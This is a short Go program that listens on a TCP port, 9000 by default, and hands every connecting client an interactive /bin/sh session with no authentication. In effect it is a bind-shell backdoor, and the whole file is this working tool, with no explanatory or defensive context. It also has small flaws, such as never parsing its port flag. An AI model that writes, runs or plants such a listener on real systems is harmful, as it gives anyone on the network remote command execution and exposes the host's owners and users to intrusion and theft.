package main

import (
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
)

func handle(conn net.Conn){
	cmd := exec.Command("/bin/sh","-i")
	rp,wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
	fmt.Println("done")
}

func main() {
	port := flag.Int("-p",9000,"port to listen on")
	if *port < 1 || *port > 65535{
		fmt.Println("illegal port!")
		os.Exit(1)
	}
	fmt.Printf("listening on %d\n",*port)

	listener,err := net.Listen("tcp", fmt.Sprintf(":%d",*port))
	if err != nil{
		fmt.Println(err)
		os.Exit(1)
	}
	for{
		conn, err:=listener.Accept()
		if err != nil{
			fmt.Println(err)
			continue
		}
		go handle(conn)
	}
}
